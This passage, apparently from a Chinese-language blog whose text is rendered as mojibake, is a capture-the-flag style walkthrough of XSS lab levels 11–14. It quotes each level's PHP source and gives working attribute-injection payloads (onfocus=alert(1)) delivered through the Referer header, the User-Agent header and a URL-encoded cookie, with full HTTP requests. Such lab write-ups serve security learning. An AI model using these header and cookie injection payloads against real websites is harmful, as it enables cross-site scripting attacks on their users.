<figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs elm">å³ä½¿æœ€ç»ˆ <span class="hljs-type">DOM</span> ä¸­æœ‰ä¸¤ä¸ª <span class="hljs-keyword">type</span>ï¼Œä½†åªè¦æµè§ˆå™¨æ›¾ç»æŠŠå®ƒå½“ä½œ text å¤„ç†ï¼Œå®ƒå°±å¯èƒ½ï¼š<br><br>åœ¨é¡µé¢ä¸Šå æ®ç©ºé—´<br>å¯ä»¥è·å¾—ç„¦ç‚¹<br>å¯ä»¥è§¦å‘ onfocus<br>è€Œ onfocus äº‹ä»¶ä¸ä¾èµ– <span class="hljs-keyword">type</span> æœ€ç»ˆå€¼ï¼Œåªè¦å…ƒç´ èƒ½è·å¾—ç„¦ç‚¹å³å¯ã€‚<br></code></pre></td></tr></table></figure>

<h2 id="level-11"><a href="#level-11" class="headerlink" title="level 11"></a>level 11</h2><p>å…ˆçœ‹ä¸€ä¸‹æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level12.php?keyword=good job!&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;æ¬¢è¿æ¥åˆ°level11&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;æ¬¢è¿æ¥åˆ°level11&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str00</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><span class="hljs-variable">$str11</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>];<br><span class="hljs-variable">$str22</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><span class="hljs-variable">$str33</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str00</span>).<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;center&gt;&lt;img src=level11.png&gt;&lt;/center&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
<p>çœ‹åˆ°$strå’Œ$str00éƒ½ä¼šè¢«è½¬ä¹‰ï¼Œä½†httpæŠ¥å¤´ä¼šè¢«å¼•ç”¨ï¼Ÿ<br>é‚£æ³¨å…¥ç‚¹å°±æ˜¯åœ¨æŠ¥å¤´äº†ï¼Œå’Œaiæ²Ÿé€šä¸€æ³¢ï¼Œ<br>æœ€åå†æŠŠä¸Šä¸€é¢˜çš„payloadæ‹¿æ¥ç”¨ï¼Œåœ¨httpæŠ¥å¤´åŠ ä¸Špayload:  </p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Referer</span>: &#x27;<span class="hljs-string">&quot; onfocus=&quot;</span>alert(<span class="hljs-number">1</span>)<span class="hljs-string">&quot; type=&quot;</span>text<span class="hljs-string">&quot; &quot;</span><br></code></pre></td></tr></table></figure>

<h2 id="level-12"><a href="#level-12" class="headerlink" title="level 12"></a>level 12</h2><p>ä¾æ—§å…ˆå·çœ‹ä¸€çœ¼æºç ï¼š  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level13.php?keyword=good job!&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;æ¬¢è¿æ¥åˆ°level12&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;æ¬¢è¿æ¥åˆ°level12&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str00</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><span class="hljs-variable">$str11</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>];<br><span class="hljs-variable">$str22</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><span class="hljs-variable">$str33</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str00</span>).<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_ua&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;center&gt;&lt;img src=level12.png&gt;&lt;/center&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html<br></code></pre></td></tr></table></figure>
<p>ä¾æ—§æŠ¥å¤´æ³¨å…¥ï¼Œè¿™æ¬¡å˜æˆUSER_AGENTäº†<br>ä¹Ÿæ˜¯ç›´æ¥æ‹¿ä¸Šé¢˜payloadæ¥ç”¨ï¼š  </p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/level12.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>localhost<br><span class="hljs-attribute">sec-ch-ua</span><span class="hljs-punctuation">: </span>&quot;Chromium&quot;;v=&quot;129&quot;, &quot;Not=A?Brand&quot;;v=&quot;8&quot;<br><span class="hljs-attribute">sec-ch-ua-mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">sec-ch-ua-platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>&#x27;&quot; onfocus=&quot;alert(1)&quot; type=&quot;text&quot; &quot;<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>none<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br></code></pre></td></tr></table></figure>

<h2 id="level-13"><a href="#level-13" class="headerlink" title="level 13"></a>level 13</h2><p>è¿›é¡µé¢å…ˆæœ‰ä¸ªphpè¯­æ³•æŠ¥é”™ï¼š  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level14.php&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;æ¬¢è¿æ¥åˆ°level13&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;æ¬¢è¿æ¥åˆ°level13&lt;/h1&gt;<br>&lt;br /&gt;<br>&lt;b&gt;Warning&lt;/b&gt;:  Cannot modify header information - headers already sent <span class="hljs-title function_ invoke__">by</span> (output started at /<span class="hljs-keyword">var</span>/www/html/level13.<span class="hljs-attr">php</span>:<span class="hljs-number">1</span>) in &lt;b&gt;/<span class="hljs-keyword">var</span>/www/html/level13.php&lt;/b&gt; on line &lt;b&gt;<span class="hljs-number">16</span>&lt;/b&gt;&lt;br /&gt;<br>&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&lt;center&gt;<br>&lt;form id=search&gt;<br>&lt;input name=<span class="hljs-string">&quot;t_link&quot;</span>  value=<span class="hljs-string">&quot;&quot;</span> type=<span class="hljs-string">&quot;hidden&quot;</span>&gt;<br>&lt;input name=<span class="hljs-string">&quot;t_history&quot;</span>  value=<span class="hljs-string">&quot;&quot;</span> type=<span class="hljs-string">&quot;hidden&quot;</span>&gt;<br>&lt;input name=<span class="hljs-string">&quot;t_sort&quot;</span>  value=<span class="hljs-string">&quot;&quot;</span> type=<span class="hljs-string">&quot;hidden&quot;</span>&gt;<br>&lt;input name=<span class="hljs-string">&quot;t_cook&quot;</span>  value=<span class="hljs-string">&quot;&quot;</span> type=<span class="hljs-string">&quot;hidden&quot;</span>&gt;<br>&lt;/form&gt;<br>&lt;/center&gt;&lt;center&gt;&lt;img src=level13.png&gt;&lt;/center&gt;<br>&lt;h3 align=center&gt;payloadçš„é•¿åº¦:<span class="hljs-number">0</span>&lt;/h3&gt;&lt;/body&gt;<br>&lt;/html&gt;<br>```  <br>  <br>çœ‹æ ·å­æ˜¯æ— æ³•è§£ææŠ¥å¤´  <br><br>å¼€æºç çœ‹çœ‹ï¼š<br><br>```php<br>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;script&gt;<br>window.alert = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="hljs-function"></span>&#123;     <br><span class="hljs-title function_ invoke__">confirm</span>(<span class="hljs-string">&quot;å®Œæˆçš„ä¸é”™ï¼&quot;</span>);<br> window.location.href=<span class="hljs-string">&quot;level14.php&quot;</span>; <br>&#125;<br>&lt;/script&gt;<br>&lt;title&gt;æ¬¢è¿æ¥åˆ°level13&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;æ¬¢è¿æ¥åˆ°level13&lt;/h1&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">setcookie</span>(<span class="hljs-string">&quot;user&quot;</span>, <span class="hljs-string">&quot;call me maybe?&quot;</span>, <span class="hljs-title function_ invoke__">time</span>()+<span class="hljs-number">3600</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str00</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><span class="hljs-variable">$str11</span>=<span class="hljs-variable">$_COOKIE</span>[<span class="hljs-string">&quot;user&quot;</span>];<br><span class="hljs-variable">$str22</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><span class="hljs-variable">$str33</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str00</span>).<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_cook&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;center&gt;&lt;img src=level13.png&gt;&lt;/center&gt;<br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h3 align=center&gt;payloadçš„é•¿åº¦:&quot;</span>.<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;&lt;/h3&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
<p>eï¼Œæ˜¯cookieå—<br>é‚£åœ¨cookieæ³¨å…¥å³å¯ï¼š  </p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /level13.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: localhost<br><span class="hljs-attribute">Cache</span>-Control: max-age=<span class="hljs-number">0</span><br><span class="hljs-attribute">sec</span>-ch-ua: <span class="hljs-string">&quot;Chromium&quot;</span>;v=<span class="hljs-string">&quot;129&quot;</span>, <span class="hljs-string">&quot;Not=A?Brand&quot;</span>;v=<span class="hljs-string">&quot;8&quot;</span><br><span class="hljs-attribute">sec</span>-ch-ua-mobile: ?<span class="hljs-number">0</span><br><span class="hljs-attribute">sec</span>-ch-ua-platform: <span class="hljs-string">&quot;Windows&quot;</span><br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">129</span>.<span class="hljs-number">0</span>.<span class="hljs-number">6668</span>.<span class="hljs-number">71</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span><br><span class="hljs-attribute">Sec</span>-Fetch-Site: none<br><span class="hljs-attribute">Sec</span>-Fetch-Mode: navigate<br><span class="hljs-attribute">Sec</span>-Fetch-User: ?<span class="hljs-number">1</span><br><span class="hljs-attribute">Sec</span>-Fetch-Dest: document<br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate, br<br><span class="hljs-attribute">Connection</span>: keep-alive<br><span class="hljs-attribute">Cookie</span>: user=&#x27;%<span class="hljs-number">22</span>%<span class="hljs-number">20</span>onfocus%<span class="hljs-number">3</span>d%<span class="hljs-number">22</span>alert(<span class="hljs-number">1</span>)%<span class="hljs-number">22</span>%<span class="hljs-number">20</span>type%<span class="hljs-number">3</span>d%<span class="hljs-number">22</span>text%<span class="hljs-number">22</span>%<span class="hljs-number">20</span>%<span class="hljs-number">22</span><br></code></pre></td></tr></table></figure>

<h2 id="level-14"><a href="#level-14" class="headerlink" title="level 14"></a>level 14</h2><p>è¿™å…³åŠ è½½äº†ä¸€ä¸ªå¥‡æ€ªçš„å›¾ç‰‡ï¼Ÿ  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;title&gt;æ¬¢è¿æ¥åˆ°level14&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;æ¬¢è¿æ¥åˆ°level14&lt;/h1&gt;<br>&lt;center&gt;&lt;iframe name=<span class="hljs-string">&quot;leftframe&quot;</span> marginwidth=<span class="hljs-number">10</span> marginheight=<span class="hljs-number">10</span> src=<span class="hljs-string">&quot;http://www.exifviewer.org/&quot;</span> frameborder=no width=<span class="hljs-string">&quot;80%&quot;</span> scrolling=<span class="hljs-string">&quot;no&quot;</span> height=<span class="hljs-number">80</span>%&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;center&gt;è¿™å…³æˆåŠŸåä¸ä¼šè‡ªåŠ¨è·³è½¬ã€‚æˆåŠŸè€…&lt;a href=/xss/level15.php?src=<span class="hljs-number">1</span>.gif&gt;ç‚¹æˆ‘è¿›level15&lt;/a&gt;&lt;/center&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>

<p>çœ‹çœ‹æºç å§ï¼š  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta http-equiv=<span class="hljs-string">&quot;content-type&quot;</span> content=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;<br>&lt;title&gt;æ¬¢è¿æ¥åˆ°level14&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;h1 align=center&gt;æ¬¢è¿æ¥åˆ°level14&lt;/h1&gt;<br>&lt;center&gt;&lt;iframe name=<span class="hljs-string">&quot;leftframe&quot;</span> marginwidth=<span class="hljs-number">10</span> marginheight=<span class="hljs-number">10</span> src=<span class="hljs-string">&quot;http://www.exifviewer.org/&quot;</span> frameborder=no width=<span class="hljs-string">&quot;80%&quot;</span> scrolling=<span class="hljs-string">&quot;no&quot;</span> height=<span class="hljs-number">80</span>%&gt;&lt;/iframe&gt;&lt;/center&gt;&lt;center&gt;è¿™å…³æˆåŠŸåä¸ä¼šè‡ªåŠ¨è·³è½¬ã€‚æˆåŠŸè€…&lt;a href=/xss/level15.php?src=<span class="hljs-number">1</span>.gif&gt;ç‚¹æˆ‘è¿›level15&lt;/a&gt;&lt;/center&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br></code></pre></td></tr></table></figure>
<p>???<br>æŸ¥äº†ä¸€ä¸‹ï¼Œç½‘ç«™æ˜¯ä¸€ä¸ªexifæŸ¥çœ‹å™¨ç”¨æ¥æŸ¥çœ‹å›¾ç‰‡ä¿¡æ¯çš„  </p>
<p>é‚£æ€è€ƒä¸€ä¸‹ï¼Œç«Ÿç„¶éƒ½æ˜¯åœ¨æˆ‘çš„å‰ç«¯ä¸Šè§£æçš„ï¼Œé‚£æˆ‘æ”¹hostæ˜¯ä¸æ˜¯èƒ½æŒ‡å‘æˆ‘æƒ³æŒ‡å‘çš„ipï¼Ÿ  </p>
